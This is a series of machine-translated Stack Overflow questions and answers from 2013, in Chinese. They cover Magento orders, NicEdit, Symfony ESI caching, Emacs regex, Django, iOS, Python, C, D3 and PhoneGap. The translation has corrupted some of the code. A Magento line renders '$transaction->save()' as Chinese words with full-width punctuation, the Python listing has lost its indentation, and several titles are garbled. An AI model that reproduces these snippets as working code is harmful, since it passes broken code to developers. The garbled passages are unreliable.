                ->setAddressType(Mage_Sales_Model_Quote_Address::TYPE_BILLING)
                ->setCustomerId(0)
                ->setCustomerAddressId(0)
                ->setCustomerAddressId(0)
                ->setFirstname($customer['firstname'])
                ->setLastname($customer['lastname'])
                ->setStreet($customer['address'])
                ->setCity($customer['city'])
                ->setCountryId($customer['country_id'])
                ->setPostcode($customer['postcode'])
                ->setTelephone($customer['phone']);
$order->setBillingAddress($billingAddress);

//准备送货地址并添加到订单中，然后设置送货方式
$shippingAddress = Mage::getModel('sales/order_address')
                ->setStoreId($storeId)
                ->setAddressType(Mage_Sales_Model_Quote_Address::TYPE_SHIPPING)
                ->setCustomerId(0)
                ->setCustomerAddressId(0)
                ->setCustomerAddressId(0)
                ->setFirstname($customer['firstname'])
                ->setLastname($customer['lastname'])
                ->setStreet($customer['address'])
                ->setCity($customer['city'])
                ->setCountryId($customer['country_id'])
                ->setPostcode($customer['postcode'])
                ->setTelephone($customer['phone']);

//添加送货地址和送货方式。             
$order->setShippingAddress($shippingAddress)
                ->setShippingMethod('yourshipping_code')
                ->setShippingDescription('您的运输描述');

//添加您的付款方式。
$orderPayment = Mage::getModel('sales/order_payment')
                                    ->setStoreId($storeId)
                                    ->setCustomerPaymentId(0)
                                    ->setMethod('cod'); //cod 是货到付款
$order->setPayment($orderPayment);

//遍历报价单中的项目，创建订单项目并将其添加到订单中，您只有一个产品，所以它只会添加一个订单项目。
foreach ($quote->getItemsCollection() as $item)
{
    $_prod = Mage::getModel('catalog/product')->load($item->getProduct()->getId());
    $rowTotal = $item->getCalculationPrice() * $item->getQty();
    $orderItem = Mage::getModel('sales/order_item')
                    ->setStoreId($storeId)
                    ->setQuoteItemId(0)
                    ->setQuoteParentItemId(NULL)
                    ->setProductId($_prod->getId())
                    ->setProductType($_prod->getTypeId())
                    ->setQtyBackordered(NULL)
                    ->setTotalQtyOrdered($item->getQty())
                    ->setQtyOrdered($item->getQty())
                    ->setName($_prod->getName())
                    ->setSku($_prod->getSku())
                    ->setPrice($item->getPrice())
                    ->setBasePrice($item->getPrice())
                    ->setOriginalPrice($item->getPrice())
                    ->setRowTotal($rowTotal)
                    ->setBaseRowTotal($rowTotal);
    $order->addItem($orderItem);
}

//设置总数
$subTotal = $quote->getGrandTotal();
$order->setSubtotal($subTotal)
        ->setBaseSubtotal($subTotal)
        ->setGrandTotal($subTotal)
        ->setBaseGrandTotal($subTotal);

//先下订单，然后保存。     
$transaction->addObject($order);
$transaction->addCommitCallback(array($order, 'place'));
$transaction->addCommitCallback(array($order, 'save'));
$事务->保存（）；
$quote->保存（）；

//清除会话和购物车。
Mage::getSingleton('checkout/session')->clear();
foreach($quote->getItemsCollection() as $_item)
{
     Mage::getSingleton('checkout/cart')->removeItem($_item->getId())->save();
}

//将用户重定向回你想要的位置。

```

# javascript - 没有内容时，如何摆脱 NicEdit 中的空白？

> ID：15163118
> 
> 赞同：0
> 
> 时间：2013-03-01T17:09:28.973
> 
> 标签：javascript, nicedit

当我使用 NicEditor 加载页面并且没有加载文本时，NicEditor 默认具有`<BR>`.

创建编辑器实例后，我添加了检查。

```
 myNiceEditor.addInstance(niceEditTextAreaSelectorClientID);
        if(myNiceEditor.nicInstances[0].getContent() == "<BR>"){
            myNiceEditor.nicInstances[0].setContent('');
        } 
```

但是，当页面加载时，我的编辑器的内容现在是`<P>&nbsp;</P>`

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T19:53:42.217

好吧，这很愚蠢。

解决方案是重复自己...

```
 myNiceEditor.addInstance(niceEditTextAreaSelectorClientID);
    if(myNiceEditor.nicInstances[0].getContent() == "<BR>"){
        myNiceEditor.nicInstances[0].setContent('');
        myNiceEditor.nicInstances[0].setContent('');
    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-05-01T08:08:28.737

```
 editor.addInstance(editorId);
if(editor.nicInstances[0].getContent() == "<br>"){
    editor.nicInstances[0].setContent('');
} 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2013-03-28T11:33:31.080

您还可以尝试以下代码，您的 html 元素`editor`的属性在哪里：`id`

```
if ( nicEditors.findEditor( 'editor' ).getContent() == "<br>" ) {
    nicEditors.findEditor( 'editor' ).setContent( '' );
} 
```

# css - 如何使悬停活动整体 ，不只是？

> ID：15163119
> 
> 赞同：0
> 
> 时间：2013-03-01T17:09:30.763
> 
> 标签：css, hyperlink, cursor, html-lists

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-01T17:15:25.543

锚元素默认设置为内联元素。在添加宽度属性之前，您需要将其显示显式设置为阻塞：

```
a {
    display: block;
} 
```

看到这个[**jsFiddle**](http://jsfiddle.net/GmceK/)。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-01T17:21:09.420

给`<a>` `display: block;`它，它应该占用列表项的可用空间，因此完全“可点击”..

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-01T17:14:51.427

# android - LoadedApk、makeApplication 上的致命错误

> ID：15163120
> 
> 赞同：0
> 
> 时间：2013-03-01T17:09:33.687
> 
> 标签：android, nullpointerexception, android-holo-everywhere, startup-error

我正在这里开发一个应用程序，到目前为止它运行良好，但现在我已经将 HoloEverywhere 库更新为 ICS 外观的布局，并且在启动时开始出现随机错误。

我搜索了这个错误，发现它可能与 Eclipse ADT 插件错误地构建了 apk 或类似的东西有关，但该错误不会仅在我从 Eclipse 启动时发生，几乎每次我重新打开时都会经常发生一段时间不使用后申请。

我的应用程序确实没有任何问题，因为它在 HoloEverywhere 之前运行良好，当我遇到这个崩溃时（每次我收到错误时应用程序都会崩溃），我只需要再次重新打开它就可以了。

这就是我得到的：

```
03-01 12:37:03.913: E/AndroidRuntime(29273): FATAL EXCEPTION: main
03-01 12:37:03.913: E/AndroidRuntime(29273): java.lang.RuntimeException: Unable to instantiate application br.uff.uffmobile.context.UffMobileApplication: java.lang.NullPointerException
03-01 12:37:03.913: E/AndroidRuntime(29273):    at android.app.LoadedApk.makeApplication(LoadedApk.java:501)
03-01 12:37:03.913: E/AndroidRuntime(29273):    at android.app.ActivityThread.handleBindApplication(ActivityThread.java:4159)
03-01 12:37:03.913: E/AndroidRuntime(29273):    at android.app.ActivityThread.access$1400(ActivityThread.java:134)
03-01 12:37:03.913: E/AndroidRuntime(29273):    at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1277)
03-01 12:37:03.913: E/AndroidRuntime(29273):    at android.os.Handler.dispatchMessage(Handler.java:99)
03-01 12:37:03.913: E/AndroidRuntime(29273):    at android.os.Looper.loop(Looper.java:137)
03-01 12:37:03.913: E/AndroidRuntime(29273):    at android.app.ActivityThread.main(ActivityThread.java:4856)
03-01 12:37:03.913: E/AndroidRuntime(29273):    at java.lang.reflect.Method.invokeNative(Native Method)
03-01 12:37:03.913: E/AndroidRuntime(29273):    at java.lang.reflect.Method.invoke(Method.java:511)
03-01 12:37:03.913: E/AndroidRuntime(29273):    at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:1007)
03-01 12:37:03.913: E/AndroidRuntime(29273):    at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:774)
03-01 12:37:03.913: E/AndroidRuntime(29273):    at dalvik.system.NativeStart.main(Native Method)
03-01 12:37:03.913: E/AndroidRuntime(29273): Caused by: java.lang.NullPointerException
03-01 12:37:03.913: E/AndroidRuntime(29273):    at android.app.LoadedApk.initializeJavaContextClassLoader(LoadedApk.java:377)
03-01 12:37:03.913: E/AndroidRuntime(29273):    at android.app.LoadedApk.getClassLoader(LoadedApk.java:320)
03-01 12:37:03.913: E/AndroidRuntime(29273):    at android.app.LoadedApk.makeApplication(LoadedApk.java:493)
03-01 12:37:03.913: E/AndroidRuntime(29273):    ... 11 more 
```

我还在任何我能找到的地方都放了 try/catch，看看我是否可以避免这个空指针，但它似乎是 HoloEverywhere 问题或内部 Android 错误。我正在使用 4.1.2 android Galaxy S Advance 对其进行测试。

# caching - 为什么使用 Symfony2 缓存响应中的 ESI 标签会被忽略？

> ID：15163121
> 
> 赞同：3
> 
> 时间：2013-03-01T17:09:33.727
> 
> 标签：caching, symfony, symfony-2.1, esi

我有一个电子商务应用程序，我正在尝试设置缓存 - 最初通过 Symfony2 反向代理，但最终通过生产中的 Varnish。我在 Apache2 上使用 Symfony 2.1.8。

我的问题是当主控制器操作被缓存时，我无法为每个请求重新检查 ESI 标签（对于像购物篮内容这样的私有内容很重要），但我不明白为什么。

例如，我使用以下代码缓存主页：

```
public function indexAction(Request $request)
{
    // check cache
    $homepage = $this->getHomepage();

    $response = new Response();
    $response->setPublic();
    $etag = md5('homepage'.$homepage->getUpdated()->getTimestamp());
    $response->setETag($etag);
    $response->setLastModified($homepage->getUpdated());

    if ($response->isNotModified($request))
    {
        // use cached version
        return $response;
    }
    else
    {
        return $this->render(
            'StoreBundle:Store:index.html.twig',
            array(
                'page' => $homepage
            ),
            $response
        );
    }
} 
```

呈现的模板扩展了基本布局模板，其中包括以下 ESI 以显示篮子：

```
{% render 'PurchaseBundle:Basket:summary' with {}, { 'standalone': true } %} 
```

（编辑：阅读 Diego 的回答后，我也使用了推荐的语法：

```
{% render url('basket_summary') with {}, {'standalone': true} %} 
```

不幸的是，这没有任何区别。）

我一直在使用篮子摘要的代码，但这是我目前所拥有的。

```
public function summaryAction()
{
    $response = new Response();
    $response->setPrivate();
    $response->setVary(array('Accept-Encoding', 'Cookie'));

    if ($this->basket->getId())
    {
        $etag = md5($this->getUniqueEtag());
        $response->setLastModified($this->basket->getUpdated());
    }
    else
    {
        $etag = md5('basket_summary_empty');
    }

    $response->setETag($etag);

    if ($response->isNotModified($this->request))
    {
        // use cached version
        return $response;
    }
    else
    {
        return $this->render(
            'PurchaseBundle:Basket:summary.html.twig',
            array(
                'basket' => $this->basket
            ),
            $response
        );
    }
} 
```

在主页以外的页面（尚未缓存）上，购物篮摘要缓存工作得很好，它始终显示正确的数据。只有当您返回主页时，您才会看到过时的信息。日志记录确认`summaryAction`除非`indexAction`实际呈现，否则不会在主页上调用。

## 编辑

在每个页面请求之后使用`error_log($kernel->getLog())`我得到这个非缓存页面：

```
GET /categories/collections: miss; GET /_internal/secure/PurchaseBundle:Basket:summary/none.html: stale, valid, store; GET /_internal/secure/CatalogBundle:Search:form/none.html: miss; GET /esi/menu/main: fresh 
```

这对于缓存的主页：

```
GET /: fresh 
```

我一定遗漏了一些明显的东西，但文档似乎没有涵盖这一点，但这意味着它只是 ESI 应该用于的那种事情。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-01T17:31:09.850

[根据CVE-2012-6431](http://symfony.com/blog/security-release-symfony-2-0-20-and-2-1-5-released)，从 2.0.20/2.1.5 开始，Symfony2 采用完全限定 URL 而不是控制器逻辑路径。因此，而不是您当前的 ESI：

```
{% render 'PurchaseBundle:Basket:summary' with {}, { 'standalone': true } %} 
```

您应该创建一个路由，然后在 twig 上使用 url 方法：

```
{% render url('basket_summary') with {}, {'standalone': true} %} 
```

另请注意，今天（3 月 1 日）新的 Symfony 稳定版本（2.2.0）已经发布，[对子请求管理进行了重大改进](http://symfony.com/blog/new-in-symfony-2-2-the-new-fragment-sub-framework)。使用这个新版本，您可以采用两种方法（摘自本书中 HTTP 缓存章节的[主版本）：](http://symfony.com/doc/master/book/http_cache.html#using-edge-side-includes)

```
{# you can use a controller reference #}
{{ render_esi(controller('...:news', { 'max': 5 })) }}

{# ... or a URL #}
{{ render_esi(url('latest_news', { 'max': 5 })) }} 
```

当前版本的链接章节的附注也值得一读，因为它们包含有用的信息和很好的提示，可以帮助您找到实际问题。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-11T02:09:39.010

Symfony2 中的 ESI 似乎不适用于您使用的 Latmodified/Etag 缓存验证结构。见这里：[https ://groups.google.com/forum/?fromgroups=#!topic/symfony2/V4BItzpLbOs](https://groups.google.com/forum/?fromgroups=#!topic/symfony2/V4BItzpLbOs)

类似问题： [Edge Side Includes and validation cache in Symfony 2](https://stackoverflow.com/questions/9633151/edge-side-includes-and-validation-cache-in-symfony-2)

我一直在尝试和你做同样的事情，但只能通过使用过期缓存来让 ESI 工作。

# regex - 在 Emacs 缓冲区中相对化绝对路径

> ID：15163132
> 
> 赞同：0
> 
> 时间：2013-03-01T17:10:20.933
> 
> 标签：regex, emacs, relative-path, absolute-path

我发现自己在缓冲区中混合了绝对路径（通过自动生成`org-structure-template-alist`）和相对路径（手写）。

尝试解决方案：

```
(let ((curdir (replace-regexp-in-string
               (expand-file-name "~/") "~/"
               (file-name-directory
                (or load-file-name buffer-file-name)))))
  (replace-regexp (concat "\"" curdir "(?1:([A-z]|[0-9]|/)*)" "\"") "\1")
  (message curdir)) 
```

但它似乎根本不起作用。这是尝试修复一个几乎可以正常工作的版本，该版本仅无法删除周围的引号：

```
(replace-regexp curdir "") 
```

* * *

第三次尝试：

```
(replace-regexp (concat ":tangle \"" curdir "\([A-z-+/.]+\)\"") "\1") 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-03T03:59:25.620

听起来您想匹配 HOME 目录下的引用绝对路径，并将它们转换为未引用的相对路径，那么如何：

```
(replace-regexp
 (concat "\"" (regexp-quote (expand-file-name "~/")) "\\(.*?\\)\"")
 "\\1") 
```

我怀疑您的大多数问题源于不理解 Emacs 的正则表达式语法，以及在用字符串表示正则表达式时的额外转义要求，因为您在这些领域有各种错误。

特别是，请记住 Emacs正则表达式`\( \)`用于分组（或`\(?: \)`用于非捕获组），并且在字符串中您需要转义作为正则表达式语法一部分的所有反斜杠。您应该阅读以下内容：

*   `C-h``i``g` `(elisp) Syntax for Strings` `RET`
*   `C-h``i``g` `(elisp) Regular Expressions` `RET`

另外，请注意`regexp-quote`将非文字值合并到正则表达式时的使用。（所有支持正则表达式的语言都将具有与此类似的功能，不使用它是自找麻烦。）

我强烈建议使用`M-x` `regexp-builder` `RET`交互式构建您的正则表达式。这无疑会为您节省很多挫败感，想知道为什么您的模式与您的预期不符。

# java - 如何将三元组添加到耶拿查询

> ID：15163137
> 
> 赞同：2
> 
> 时间：2013-03-01T17:10:44.573
> 
> 标签：java, sparql, jena

假设我有一些耶拿查询对象：

```
String query = "SELECT * WHERE{ ?s <some_uri> ?o ...etc. }";
Query q = QueryFactory.create(query, Syntax.syntaxARQ); 
```

如何以一种有效的方式获取有关 jena 查询对象的信息并迭代地添加三元组？例如，假设我想添加三元组

```
?o dcterms:title "TheBestTitle".
?o dcterms:date ?date. 
```

到查询，也许更多。
有没有办法将这些三元组添加到查询中，或者做一些魔术来创建一个新的查询对象，它看起来像添加了这些三元组的原始查询对象？假设我可能还需要从查询的原始版本中获取信息（例如，List resultVars = q.getResultVars();）。

我的一些线索是使用 Jena API 提供的 AlgebraGenerator 和 Op 类，但我似乎无法在这样的上下文中找到任何合理的用例。

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-02T10:57:35.837

[http://jena.apache.org/documentation/query/manipulating_sparql_using_arq.html](http://jena.apache.org/documentation/query/manipulating_sparql_using_arq.html)

1.  构造代数表达式并转换为查询 (OpAsQuery)
2.  Query 对象，它是清理后的解析结构，可以被操纵 ( `Query.getQueryPattern`)
3.  在解析之前通过字符串操作来做到这一点。

# csv - 使用 highcharts 从 csv 中读取特定行

> ID：15163145
> 
> 赞同：0
> 
> 时间：2013-03-01T17:11:16.030
> 
> 标签：csv, highcharts

我有一个生成 csv 文件的天气服务器，如下所示：

```
 Date,time,Temp. Innentemperatur,Temp. Aussentemperatur,Hum. Aussentemperatur,Regen,Wind,Wind Direction,Wind Gust
    ,,∞C,∞C,%,l/qm,km/h,∞,km/h

    ,,1,2,18,34,35,36,45,133
    01.03.2013,00:00,21.5,1.4,89.0,,1.8,285,3.6,1024.9
    01.03.2013,00:01,21.5,1.4,89.0,,1.8,285,3.6,1024.9 
```

可以只读指定行吗？示例：日期和时间和嗡嗡声。?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-04T10:36:11.400

是的，当您获取数据并使用循环将数据推送到 series.data 数组时，您可以跳过适当的行。我建议熟悉有关预处理数据的文章[http://docs.highcharts.com/#preprocesssing-data-from-a-file](http://docs.highcharts.com/#preprocesssing-data-from-a-file)

# django - Django多次删除不起作用

> ID：15163146
> 
> 赞同：0
> 
> 时间：2013-03-01T17:11:16.360
> 
> 标签：django, django-admin

我有以下删除方法，这在单独删除一条记录时有效，但在管理员中删除多条记录时无效，即通过列表视图，为什么以及如何修复？

```
def delete(self, *args, **kwargs):

        this = Profile.objects.get(id=self.id)
        this.image.delete(save=True)

        super(Profile, self).delete(*args, **kwargs) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T17:18:18.250

我建议使用`signals`删除您的相关图像，请查看[文档](https://docs.djangoproject.com/en/dev/ref/signals/#pre-delete)`pre_delete signal`中的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T17:21:10.463

Django 文档实际上提到了您在管理操作中的确切情况：[https ://docs.djangoproject.com/en/dev/ref/contrib/admin/actions/](https://docs.djangoproject.com/en/dev/ref/contrib/admin/actions/)

或者，如果您想在其他地方使用，您可以考虑覆盖默认的 Manager 和 QuerySet 模型`Model.objects.delete`。

# ios - UIInterfaceOrientation 保持纵向

> ID：15163149
> 
> 赞同：0
> 
> 时间：2013-03-01T17:11:33.777
> 
> 标签：ios, objective-c, uiinterfaceorientation

我有一个*在 iPad 和 iPhone 之间变化*的标题/品牌形象，但*在从纵向变为横向时不会改变图片*，这真的很重要。

我有这个 HeaderView 类，它由 tableViewControllers 调用，如下所示：

```
self.tableView.tableHeaderView = [[HeaderView alloc] initWithText:@""]; 
```

它拥有一个 UIImageView：

```
@interface HeaderView : UIImageView{

}
- (id)initWithText:(NSString*)text;
- (void)setText:(NSString*)text;

@end 
```

对于 M 文件，我们找到了我没有得到我想要的结果的地方：

```
#import "HeaderView.h"

#define IDIOM    UI_USER_INTERFACE_IDIOM()
#define IPAD     UIUserInterfaceIdiomPad
@interface HeaderView()
{
    UILabel*label;
}
@end

@implementation HeaderView 

- (id)initWithText:(NSString*)text
{
    UIImage* img = [UIImage imageNamed:@"WashU.png"];
    UIImage* iPhonePortrait = [UIImage imageNamed:@"WashU2.png"];
    UIImage* image = [[UIImage alloc] init];

    UIInterfaceOrientation interfaceOrientation = [UIApplication     sharedApplication].statusBarOrientation;

        //different header image for different devices...
    if(IDIOM==IPAD){
        image = img;
    }
    else{
        if(UIInterfaceOrientationIsPortrait(interfaceOrientation)){
        image = iPhonePortrait;
        }
        else if(UIInterfaceOrientationIsLandscape(interfaceOrientation))
        {
            iPhonePortrait = nil;
            image = img;
        } 
    }    
    [headerImageView setImage:image];
    if (self = [super initWithImage:image]){

    }

    return self;
} 
```

我还添加了这些方法：

```
-(BOOL)shouldAutorotateToInterfaceOrientation:(UIInterfaceOrientation)interfaceOrientation         {
    return YES;
}

-(BOOL)shouldAutorotate {
    return YES;
}

-(NSUInteger)supportedInterfaceOrientations {
    return UIInterfaceOrientationMaskAll;
} 
```

我敢肯定这是一个经典的问题，但我很困惑。另外，如果我删除

```
[headerImageView setImage:image]; 
```

， 和

```
[self addSubview:headerImageView]; 
```

，图像仍然出现，这意味着

```
if (self = [super initWithImage:image]) 
```

正在做所有的展示工作。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T17:55:23.403

作为您的代码，您不需要分配 (UIImage*)image 属性，因为您将分配 (UIImage*)img 或 (UIImage*)iPhonePortrait。并且应该将图像分配给 headerImageView.image。

```
[headerImageView setImage:image]; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T17:44:19.287

您实际上并没有将图像分配给 imageView。添加：

```
headerImageView.image = image; 
```

在设置“图像”之后的某个地方（基于 iPad 与 iPhone 和纵向与横向）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T17:21:18.747

didRotateFromInterfaceOrientation 在旋转后被发送到你的视图控制器，你可以实现它来改变你的图像。

```
-(void)didRotateFromInterfaceOrientation:(UIInterfaceOrientation)fromInterfaceOrientation
{
      ...change your image here
} 
```

# python - 调试？计算成绩并获得无类型？

> ID：15163150
> 
> 赞同：0
> 
> 时间：2013-03-01T17:11:36.343
> 
> 标签：python, string, debugging

继续收到错误报告

文件“/home/hilld5/DenicaHillPP4.py”，第 72 行，在 maingradeReport =gradeReport +“\n”+ studentName +“:\t%6.1f”%studentScore+“\t”+studentGrade TypeError: cannot concatenate 'str ' 和 'NoneType' 对象

但似乎无法弄清楚为什么学生成绩没有返回

```
studentName = ""
studentScore = ""

def getExamPoints (total): #calculates Exam grade
total = 0.0
for i in range (4):
    examPoints = input ("Enter exam " + str(i+1) + " score for " + studentName + ": ")
total += int(examPoints)
total = total/.50       
total = total * 100
return total

def getHomeworkPoints (total):#calculates homework grade
total = 0.0
for i in range (5):
    hwPoints = input ("Enter homework " + str(i+1) + " score for " + studentName + ": ")
total += int(hwPoints)
total = total/.10       
total = total * 100
return total

 def getProjectPoints (total): #calculates project grade
total = 0.0
for i in range (3):
    projectPoints = input ("Enter project " + str(i+1) + " score for " + studentName + ": ")
total += int(projectPoints)
total = total/.40       
total = total * 100
return total

def computeGrade (total): #calculates grade
if studentScore>=90:
     grade='A'
elif studentScore>=80 and studentScore<=89:
    grade='B'
    elif studentScore>=70 and studentScore<=79:
        grade='C'
elif studentScore>=60 and studentScore<=69:
        grade='D'
else:
    grade='F'

def main ( ):

classAverage = 0.0      # initialize averages
classAvgGrade = "C"

studentScore = 0.0
classTotal = 0.0
studentCount = 0
gradeReport = "\n\nStudent\tScore\tGrade\n============================\n"

studentName = raw_input ("Enter the next student's name, 'quit' when done: ")

while studentName != "quit":

    studentCount = studentCount + 1

    examPoints = getExamPoints (studentName)
    hwPoints = getHomeworkPoints (studentName)
    projectPoints = getProjectPoints  (studentName)

    studentScore = examPoints + hwPoints + projectPoints

    studentGrade = computeGrade (studentScore)

    gradeReport = gradeReport + "\n" + studentName + ":\t%6.1f"%studentScore+"\t"+studentGrade 

    classTotal = classTotal + studentScore

    studentName = raw_input ("Enter the next student's name, 'quit' when done: ")

print gradeReport

classAverage = int ( round (classTotal/studentCount) )

# call the grade computation function to determine average class grade

classAvgGrade = computeGrade ( classAverage )

print  "Average class score: " , classAverage, "\nAverage class grade: ", classAvgGrade 

main ( ) # Launch 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T17:19:06.967

您的`computeGrade`函数中有两个错误：

1.  您不要在函数的`total`任何地方引用函数的单个参数 ( )。
2.  该函数没有返回语句。

更正后的版本可能如下所示：

```
def computeGrade (studentScore): #calculates grade
if studentScore>=90:
    grade='A'
elif studentScore>=80 and studentScore<=89:
    grade='B'
elif studentScore>=70 and studentScore<=79:
    grade='C'
elif studentScore>=60 and studentScore<=69:
    grade='D'
else:
    grade='F'
return grade 
```

# c - 打印动态字符串数组时崩溃

> ID：15163157
> 
> 赞同：0
> 
> 时间：2013-03-01T17:12:04.063
> 
> 标签：c, arrays, string, dynamic

我在使用字符串数组时遇到问题。创建字符串数组时，我可以打印例如 globals[0] 的数据，但在函数结束时，应用程序在执行相同操作时会崩溃。有谁知道这是什么原因？

```
#define TRUE    1
#define FALSE   0

#ifdef _MSC_VER
#define _CRT_SECURE_NO_WARNINGS
#endif

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>

char** globals; // Naam van alle globals
int* adressen; // Adres van alle globals
unsigned int index; // Plaats voor het toevoegen van globals

int InitializeGlobals(char* path)
{
    // Variabelen voor het bestand
    struct stat st;
    FILE* bestand;

    // Variabelen voor de regels in op te slaan
    char* buffer;

    // Variabelen voor strings te tellen
    unsigned int i;
    unsigned int aantal = 0;
    unsigned char b = FALSE;

    // Variabelen voor het omzetten van de buffer
    char* number;
    unsigned int grootte;
    unsigned int start;
    unsigned int tmp;

    // Debug variabelen
    int debug;

    // Bestand in de buffer lezen en sluiten
    //
    //
    bestand = fopen(path, "r");
    if (bestand == NULL) {
        printf("Kon het opgegeven bestand niet openen! globals.c/r42\n");
        return -1;
    }

    debug = stat(path, &st);
    if (debug < 0) {
        printf("Kon het opgegeven bestand niet analyzeren! globals.c/r48, return: %i\n", debug);
        return -2;
    }

    buffer = (char*)malloc(st.st_size);
    if (buffer == NULL) {
        return -3;
    }

    fread(buffer, 1, st.st_size, bestand);
    fclose(bestand);

    // Het aantal strings vinden en de arrays klaarmaken
    //
    //
    for (i = 0; i < (unsigned int)st.st_size; i++) {
        if (buffer[i] == '\n' && b == FALSE) {
            aantal++;
        }
        else {
            b = FALSE;
        }
    }

    globals = (char**)malloc(sizeof(char*)*aantal);
    adressen = (int*)malloc(sizeof(int*)*aantal);

    // Buffer omzetten naar de string array "globals" en de int array "adressen"
    //
    //
    b = FALSE;
    index = 0;
    start = 0;
    for (i = 0; i < (unsigned int)st.st_size; i++) {
        if (b == TRUE) {
            if (buffer[i] == '\n') {
                b = FALSE;
                start = i+1;
            }
        }
        else if (buffer[i] == ';') {
            b = TRUE;
        }
        else if (buffer[i] == '=') {
            grootte = (i-start);
            number = (char*)malloc(grootte);
            if (number == NULL) {
                return i+1;
            }
            memcpy(number, buffer+start, grootte);
            start = i+1;
            tmp = atoi(number);
            memcpy(&adressen[index], &tmp, 4); // application is x86 only
            index++;
            free(number);
        }
        else if (buffer[i] == '\n') {
            grootte = (i-start);
            globals[index] = (char*)malloc(grootte+1);
            if (globals[index] == NULL) {
                return i+1;
            }
            memcpy(globals[index], buffer+start, grootte); 
            globals[index][grootte] = '\0';
            start = i+1;
            printf("%s\n", globals[index]);
        }
    }

    free(buffer);
    printf("%s", globals[0]); // <-- crash

    return 0;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T17:45:12.290

这`0xCDCDCDCD`解决了调试运行时标记[未初始化堆内存](http://en.wikipedia.org/wiki/Magic_number_%28programming%29)的方式。因此可以安全地假设 globals[0] 从未初始化。

假设这可能如何发生：

如果您的输入文件是空的，或者如果它有一行文本，该行不以换行符结尾，那么您将永远不会分配 globals[0]。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T17:46:29.607

你能检查输入文件吗？

在代码中，您期望在 globals[0] 处输出，但会崩溃。

查看代码，索引变量在输入字符为“=”或“\n”时更新。检查文本文件是否在“\n”之前包含“=”。在这种情况下，索引将递增，并且 globals[] 永远不会在索引 0 处分配内存。

# javascript - D3 相当于 jQuery 的子选择器？

> ID：15163163
> 
> 赞同：2
> 
> 时间：2013-03-01T17:12:27.530
> 
> 标签：javascript, jquery, d3.js

我正在寻找 jQuery 的子选择器的 D3 等价物，例如：

```
$('rect', this).addClass('active'); 
```

我的用例是这样的：每当用户单击父元素时，我希望`rect`元素切换类。`active``.bar`

```
<g class="bar">
  <rect height="18" width="300"></rect>
  <text class="label">Wholesale </text>
  <text class="value">679</text>
 </g> 
```

目前我有这个：

```
bar.on('click', function(d) { 
 if (d3.select(this).classed("active")) {
  d3.select(this).classed("active", false);
 } else { 
  d3.select(this).classed("active", true);
 }
}); 
```

但是，这显然是将`active`类应用于`g`元素，而不是`rect`我想要的。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-03-01T17:29:13.863

```
var bar = d3.select(".bar");
bar.on('click', 
       function(d) { 
           var rect = d3.select(this).select("rect");
           var hasClass = rect.classed("active");
           rect.classed("active", !hasClass); 
       }
); 
```

# phonegap-plugins - 画布相机插件

> ID：15163174
> 
> 赞同：0
> 
> 时间：2013-03-01T17:13:17.823
> 
> 标签：phonegap-plugins

我正在尝试实现 CanvasCamera 插件，我遵循了该过程，但是当我尝试在模拟器中运行该项目时，我标记了 8 个错误：

架构 i386 的未定义符号：“_CVPixelBufferGetBaseAddress”，引用自：-[CanvasCamera captureOutput:didOutputSampleBuffer:fromConnection:] in CanvasCamera.o “_CVPixelBufferGetBytesPerRow”，引用自：-[CanvasCamera captureOutput:didOutputSampleBuffer:fromConnection:] in CanvasCamera.o “_CVPixelBufferGetHeight "，引用自：-[CanvasCamera captureOutput:didOutputSampleBuffer:fromConnection:] in CanvasCamera.o "_CVPixelBufferGetWidth"，引用自：-[CanvasCamera captureOutput:didOutputSampleBuffer:fromConnection:] in CanvasCamera.o "_CVPixelBufferLockBaseAddress"，引用自：-[CanvasCamera CanvasCamera.o "_CVPixelBufferUnlockBaseAddress" 中的 captureOutput:didOutputSampleBuffer:fromConnection:]，引用自：-[CanvasCamera captureOutput:didOutputSampleBuffer:fromConnection:] in CanvasCamera.o "_kCVPixelBufferPixelFormatTypeKey"，引用自： -[CanvasCamera startCapture:withDict:] in CanvasCamera.o ld：未找到架构 i386 clang 的符号：错误：链接器命令退出代码 1 失败（使用 -v 查看调用）

你能帮我解决这个问题吗？

我在 Mac mini 英特尔 i5 处理器 Os X 10.8.2 Xcode 4.5 中进行测试

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-08-16T08:45:26.077

您忘记在项目的 Build Phases 选项卡中添加 CoreVideo.framework 库。

当你按下产品/存档时，你会得到这个错误。检查[使用 phonegap v 2.9 构建 XCode 4.6 版本的存档](https://stackoverflow.com/questions/17351446/building-an-archive-for-xcode-4-6-release-with-phonegap-v-2-9-fails)无法解决。

# php - 使用外部 css 显示获取的 mysql 数据

> ID：15163183
> 
> 赞同：0
> 
> 时间：2013-03-01T17:13:40.623
> 
> 标签：php, mysql, css, phpmyadmin

如何附加外部 CSS 文件以显示从 MySQL 数据库获取的数据？我可以使用 CSS 而不是使用表格来显示数据吗？我想完全避免在显示获取的数据时使用表格。

这是从 MySQL 数据库中获取数据的代码：

```
<?php
echo "Database Date: " .date("Y-m-d");
?> 
```

